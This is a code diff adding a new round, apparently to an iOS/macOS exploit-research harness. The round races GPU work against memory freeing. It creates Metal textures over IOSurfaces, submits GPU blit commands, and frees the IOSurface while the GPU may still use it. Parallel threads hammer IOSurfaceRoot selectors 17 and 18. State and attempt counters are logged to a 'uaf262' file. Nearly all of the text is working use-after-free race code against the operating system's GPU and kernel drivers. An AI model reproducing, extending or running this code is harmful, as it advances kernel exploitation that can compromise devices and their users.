@@ -1728,6 +1728,141 @@ static void *r259_unreg_fn(void *arg) {
     return NULL;
 }
 
+/* r262: Metal GPU race with proper objc_msgSend casting for arm64e */
+#include <objc/runtime.h>
+#include <objc/message.h>
+
+static volatile int r262_run = 0;
+static volatile int r262_tex_ok = 0;
+static volatile int r262_tex_fail = 0;
+static volatile int r262_blit_ok = 0;
+static volatile int r262_freed = 0;
+
+/* Properly typed objc_msgSend variants for arm64e PAC */
+typedef id (*msg_id_t)(id, SEL);
+typedef id (*msg_id_id_t)(id, SEL, id);
+typedef id (*msg_id_ptr_ulong_ulong_t)(id, SEL, id, void *, unsigned long, unsigned long);
+typedef void (*msg_void_t)(id, SEL);
+typedef void (*msg_void_id_t)(id, SEL, id);
+typedef void (*msg_void_ulong_t)(id, SEL, unsigned long);
+typedef void (*msg_void_ulong_ulong_ulong_ulong_t)(id, SEL, unsigned long, unsigned long, unsigned long, unsigned long);
+
+static void *r262_gpu_fn(void *arg) {
+    int tid = (int)(uintptr_t)arg;
+    (void)tid;
+
+    /* Get objc_msgSend */
+    void *objc_lib = dlopen("/usr/lib/libobjc.A.dylib", RTLD_LAZY);
+    if (!objc_lib) return NULL;
+    void *msgSend = dlsym(objc_lib, "objc_msgSend");
+    if (!msgSend) { dlclose(objc_lib); return NULL; }
+
+    msg_id_t send_id = (msg_id_t)msgSend;
+    msg_id_id_t send_id_id = (msg_id_id_t)msgSend;
+    msg_id_ptr_ulong_ulong_t send_id_ptr_uu = (msg_id_ptr_ulong_ulong_t)msgSend;
+    msg_void_t send_void = (msg_void_t)msgSend;
+    msg_void_id_t send_void_id = (msg_void_id_t)msgSend;
+    msg_void_ulong_t send_void_ulong = (msg_void_ulong_t)msgSend;
+    msg_void_ulong_ulong_ulong_ulong_t send_void_4ulong = (msg_void_ulong_ulong_ulong_ulong_t)msgSend;
+
+    /* Get Metal framework */
+    void *metal = dlopen("/System/Library/Frameworks/Metal.framework/Metal", RTLD_LAZY);
+    if (!metal) { dlclose(objc_lib); return NULL; }
+
+    typedef id (*CreateDev_t)(void);
+    CreateDev_t createDev = (CreateDev_t)dlsym(metal, "MTLCreateSystemDefaultDevice");
+    if (!createDev) { dlclose(metal); dlclose(objc_lib); return NULL; }
+
+    id device = createDev();
+    if (!device) { dlclose(metal); dlclose(objc_lib); return NULL; }
+
+    /* Create a command queue */
+    id cmdQueue = send_id(device, sel_registerName("newCommandQueue"));
+    if (!cmdQueue) { dlclose(metal); dlclose(objc_lib); return NULL; }
+
+    int w = 128, h = 128, bpe = 4, bpr = w * bpe, pf = 0x42475241;
+
+    while (r262_run) {
+        /* Create IOSurface */
+        CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn);
+        CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+        IOSurfaceRef surf = IOSurfaceCreate(props);
+        CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn);
+        CFRelease(props);
+        if (!surf) continue;
+
+        /* Create MTLTextureDescriptor */
+        Class descClass = objc_getClass("MTLTextureDescriptor");
+        id desc = send_id((id)descClass, sel_registerName("new"));
+        if (desc) {
+            /* setPixelFormat: 80 = MTLPixelFormatBGRA8Unorm */
+            send_void_ulong(desc, sel_registerName("setPixelFormat:"), 80);
+            send_void_ulong(desc, sel_registerName("setWidth:"), w);
+            send_void_ulong(desc, sel_registerName("setHeight:"), h);
+            /* setUsage: 1=ShaderRead | 2=ShaderWrite | 4=RenderTarget */
+            send_void_ulong(desc, sel_registerName("setUsage:"), 1 | 2);
+            send_void_ulong(desc, sel_registerName("setStorageMode:"), 1); /* shared */
+
+            /* newTextureWithDescriptor:iosurface:plane:level: */
+            id texture = send_id_ptr_uu(device,
+                sel_registerName("newTextureWithDescriptor:iosurface:plane:level:"),
+                desc, (void *)surf, 0, 0);
+
+            if (texture) {
+                __sync_fetch_and_add(&r262_tex_ok, 1);
+
+                /* Create command buffer */
+                id cmdBuf = send_id(cmdQueue, sel_registerName("commandBuffer"));
+                if (cmdBuf) {
+                    /* Create blit command encoder */
+                    id blit = send_id(cmdBuf, sel_registerName("blitCommandEncoder"));
+                    if (blit) {
+                        /* fillBuffer/copyFromTexture — just do a texture read operation.
+                           synchronizeTexture:slice:level: (iOS may not have this)
+                           Instead: generateMipmapsForTexture: */
+                        send_void_id(blit, sel_registerName("generateMipmapsForTexture:"), texture);
+                        send_void(blit, sel_registerName("endEncoding"));
+                        __sync_fetch_and_add(&r262_blit_ok, 1);
+                    }
+
+                    /* Commit — submits to GPU hardware */
+                    send_void(cmdBuf, sel_registerName("commit"));
+
+                    /* DON'T waitUntilCompleted — let GPU run while we free */
+                }
+
+                /* Release texture reference — but GPU command buffer still references the IOSurface */
+                send_void(texture, sel_registerName("release"));
+            } else {
+                __sync_fetch_and_add(&r262_tex_fail, 1);
+            }
+            send_void(desc, sel_registerName("release"));
+        }
+
+        /* Free the IOSurface while GPU might still be processing */
+        CFRelease(surf);
+        __sync_fetch_and_add(&r262_freed, 1);
+
+        /* Every 16th iteration, yield to let GPU hardware execute */
+        if ((r262_freed & 15) == 0) sched_yield();
+    }
+
+    send_void(cmdQueue, sel_registerName("release"));
+    dlclose(metal);
+    dlclose(objc_lib);
+    return NULL;
+}
+
 /* r261: IOKit GPU user client selector probe — find which selectors are
    accessible from the app sandbox on IOGPUDevice and IOSurfaceRoot */
 
@@ -20400,6 +20535,70 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 262) {
+            rlog("*** rounds=262: Metal GPU race (proper arm64e ABI) ***\n");
+            rlog("  Create Metal texture from IOSurface → submit GPU blit → free IOSurface\n");
+            rlog("  GPU DMA races with IOSurface deallocation\n\n");
+
+            char r262_sp[256];
+            { char *h = getenv("HOME"); snprintf(r262_sp, sizeof(r262_sp), "%s/Documents/uaf262_state.bin", h?h:"/tmp"); }
+            int r262_att = 0;
+            { FILE *f = fopen(r262_sp, "rb"); if (f) { uint32_t m; if (fread(&m,4,1,f)==1 && m==0xDEAD0262) fread(&r262_att,4,1,f); fclose(f); } }
+            r262_att++;
+            rlog("  Attempt #%d\n", r262_att);
+            { FILE *f = fopen(r262_sp, "wb"); if (f) { uint32_t m=0xDEAD0262; fwrite(&m,4,1,f); fwrite(&r262_att,4,1,f); fflush(f); fsync(fileno(f)); fclose(f); } }
+
+            int r262_secs = 20;
+            if (argc > 3) r262_secs = atoi(argv[3]);
+            rlog("  Duration: %d seconds\n", r262_secs);
+            fflush(stdout);
+
+            r262_run = 1;
+            r262_tex_ok = 0; r262_tex_fail = 0; r262_blit_ok = 0; r262_freed = 0;
+
+            /* 2 GPU threads */
+            pthread_t r262_th[2];
+            for (int i = 0; i < 2; i++)
+                pthread_create(&r262_th[i], NULL, r262_gpu_fn, (void*)(uintptr_t)i);
+
+            /* sel17/18 churn */
+            io_service_t r262_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            io_connect_t r262_conn = IO_OBJECT_NULL;
+            if (r262_svc) IOServiceOpen(r262_svc, mach_task_self(), 0, &r262_conn);
+            g_race250_conn = r262_conn;
+            g_race250_run = r262_conn ? 1 : 0;
+            g_race250_reg_ok = 0; g_race250_reg_fail = 0;
+            g_race250_dereg_ok = 0; g_race250_dereg_fail = 0;
+            pthread_t r262_t17, r262_t18;
+            if (r262_conn) {
+                pthread_create(&r262_t17, NULL, g_race250_sel17_fn, NULL);
+                pthread_create(&r262_t18, NULL, g_race250_sel18_fn, NULL);
+            }
+
+            for (int s = 0; s < r262_secs; s++) {
+                usleep(1000000);
+                rlog("  +%ds tex_ok=%d tex_fail=%d blit=%d freed=%d reg=%d/%d\n", s+1,
+                     r262_tex_ok, r262_tex_fail, r262_blit_ok, r262_freed,
+                     g_race250_reg_ok, g_race250_reg_fail);
+            }
+
+            r262_run = 0;
+            g_race250_run = 0;
+            for (int i = 0; i < 2; i++) pthread_join(r262_th[i], NULL);
+            if (r262_conn) {
+                pthread_join(r262_t17, NULL);
+                pthread_join(r262_t18, NULL);
+                IOServiceClose(r262_conn);
+                IOObjectRelease(r262_svc);
+            }
+
+            rlog("\n  === SURVIVED Metal GPU race! ===\n");
+            rlog("  tex_ok=%d tex_fail=%d blit=%d freed=%d\n",
+                 r262_tex_ok, r262_tex_fail, r262_blit_ok, r262_freed);
+            rlog("*** r=262 complete ***\n");
             goto done;
         }
         if (rounds == 261) {
